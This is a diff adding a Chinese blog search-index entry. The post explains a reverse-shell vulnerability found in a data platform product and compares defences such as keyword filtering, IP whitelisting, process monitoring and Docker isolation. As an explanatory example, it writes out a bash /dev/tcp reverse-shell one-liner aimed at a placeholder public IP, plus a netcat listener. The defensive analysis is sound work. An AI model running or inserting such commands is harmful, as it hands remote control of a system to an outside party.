@@ -1,6 +1,53 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>shell反弹渗透技术分析和解决方案</title>
+    <url>/2021/05/16/shell%E5%8F%8D%E5%BC%B9%E6%B8%97%E9%80%8F%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
+    <content><![CDATA[<h1 id="一-背景"><a href="#一-背景" class="headerlink" title="一. 背景"></a>一. 背景</h1><p>&nbsp;&nbsp;目前公司的产品的《命令行复测结果简报》中检测出反弹shell漏洞, 需要对该问题做出相关相关应对方案。</p>
+<h1 id="二-反弹shell介绍"><a href="#二-反弹shell介绍" class="headerlink" title="二. 反弹shell介绍"></a>二. 反弹shell介绍</h1><p>&nbsp;&nbsp;反弹shell(reverse shell)，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制<br>端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的⻆色反转。<br>&nbsp;&nbsp;例子:  </p>
+<ul>
+<li>攻击者在其机器上监听端口  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过netcat工具监听 6767端口号(tcp&#x2F;udp)并且输出交互信息</span><br><span class="line"> nc -lvp 6767</span><br></pre></td></tr></table></figure></li>
+<li>在被攻击端执行下面命令  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;产生一个交互的shell 并且建立socket连接读取这个文件</span><br><span class="line"> bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;公网ip&#x2F; 6767 0 &gt;&amp; 1</span><br></pre></td></tr></table></figure>
+&nbsp;&nbsp;反弹shell 时序图如下：<br><img src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/image.png" alt="image"></li>
+</ul>
+<h1 id="三-漏洞分析"><a href="#三-漏洞分析" class="headerlink" title="三. 漏洞分析"></a>三. 漏洞分析</h1><p>&nbsp;&nbsp;该漏洞的核心思想是在被攻击节点建立socket通道连接外网打通攻击者服务器,从而实现渗透。用户可以通过Datasimba 执行<br>shell 、python、jar 实现shell反弹,分析该问题目前能想到的解决思路如下:  </p>
+<ul>
+<li>限定被攻击节点对外访问请求；</li>
+<li>监听 socket 通道的进程 发现即kill或报警</li>
+<li>通过用户空间隔离技术(chroot)</li>
+<li>通过容器虚拟化技术实现环境资源隔离<br>按照以上思路提供的解决方案</li>
+</ul>
+<h1 id="四-反弹shell防御方案"><a href="#四-反弹shell防御方案" class="headerlink" title="四. 反弹shell防御方案"></a>四. 反弹shell防御方案</h1><h5 id="方案一-产品功能对任务代码的关键字作限制"><a href="#方案一-产品功能对任务代码的关键字作限制" class="headerlink" title="方案一: 产品功能对任务代码的关键字作限制"></a>方案一: 产品功能对任务代码的关键字作限制</h5><ul>
+<li>解释：代码中如果包含类似shell反弹的任务不能进行保存和运行  </li>
+<li>优点：从源头上避免反弹shell代码进入到产品服务内部  </li>
+<li>缺点：用户可以通过在代码中添加包含反弹shell的文件,或者通过下载外部文件的<br>方式绕过校验限制  </li>
+</ul>
+<h5 id="方案二-对被攻击节点-增加-ip白名单限制外网访问"><a href="#方案二-对被攻击节点-增加-ip白名单限制外网访问" class="headerlink" title="方案二: 对被攻击节点 增加 ip白名单限制外网访问"></a>方案二: 对被攻击节点 增加 ip白名单限制外网访问</h5><ul>
+<li>解释：<br>i. 目前Dataworkes(阿里云) 对于ip白名单 shell反弹的解决思路<br>ii. 目前有的客户就是使用禁止外网访问的方式避免掉的  </li>
+<li>优点：配置简单,从源头上解决问题,可以有效控制被攻击节点的ip</li>
+<li>缺点：灵活性差,比如simba接入新的数据源,则数据源的ip需要添加到白名单中</li>
+</ul>
+<h5 id="方案三-自动防御shell反弹"><a href="#方案三-自动防御shell反弹" class="headerlink" title="方案三: 自动防御shell反弹"></a>方案三: 自动防御shell反弹</h5><ul>
+<li>解释：通过linux IPC机制Netlink，用于在内核与用户进程之间传递消息,捕获进程事件信息，通过监控到的进程信息进行处理</li>
+<li>优点：自动监控系统进程,发现非法进程直接kill,一般情况下绕过较难</li>
+<li>缺点：i. 运维成本增加<br>ii. 通过上传可执行文件通过其他思路实现反弹,比如通过java或者python写一个SocketServer 程序执行.</li>
+</ul>
+<h5 id="方案四-通过容器虚拟化技术建立隔离操作系统"><a href="#方案四-通过容器虚拟化技术建立隔离操作系统" class="headerlink" title="方案四: 通过容器虚拟化技术建立隔离操作系统"></a>方案四: 通过容器虚拟化技术建立隔离操作系统</h5><ul>
+<li>解释：<br>i.首先在产品的工作节点上通过docker技术创建出虚拟化的容器作为隔离层<br>ii.在功能中对于python、shell、jar任务类型在simba的工作节点上真正执行时我们会在隔离层<br>执行相关逻辑(只依赖其操作系统环境)。如果出现黑客攻击者通过shell反弹技术入侵其实操作的是虚拟出来的操作系统,不会对容器外<br>部的机器造成任何威胁。</li>
+<li>优点: 通过容器虚拟化技术虚拟出新的操作系统实现完全的隔离。</li>
+<li>缺点：对simba现有worker的工作节点进行架构优化改造，短时间内无法完成。</li>
+</ul>
+<h1 id="五-目前的思路"><a href="#五-目前的思路" class="headerlink" title="五. 目前的思路"></a>五. 目前的思路</h1><ul>
+<li>思路一：通过方案二来从源头上解决问题(可能会增加额外的配置成本)</li>
+<li>思路二: 可以通过方案一、方案三组合使用,通过方案一和方案三的优缺点进行互补,方案一从产品层面限制反弹<br>shell进入到产品平台,方案三可防止通过引用上传文件绕过的限制。可以避免大多数场景。理论上进入到产品平台的用户<br>大多数都是内部和已知用户都可以追溯和溯源(排除账号被盗问题)</li>
+<li>思路三: 为了彻底解决非法用户通过编写其他技术方式实现所谓的’反弹’,后续会排期对产品的工作节点增加方案四-容器<br>虚拟化的方式来避免’反弹’问题。</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>10分钟了解SimbaFs解决hadoop存算分离问题</title>
     <url>/2021/04/12/10%E5%88%86%E9%92%9F%E4%BA%86%E8%A7%A3SimbaFs%E8%A7%A3%E5%86%B3hadoop%E5%AD%98%E7%AE%97%E5%88%86%E7%A6%BB%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;众所周知传统的 Apache Hadoop 的架构存储和计算是耦合在一起的, HDFS 作为其分布式文件系统也面临一些问题。如: 存储空间或者计算资源不足两者只能同时扩容、扩容效率低、额外增加成本、灵活性差等。本文会大家回顾Hadoop的传统架构来分析上述问题以及Hadoop实现存算分离的方案和DataSimba的对于Hadoop存算分离的最佳实践。</p>
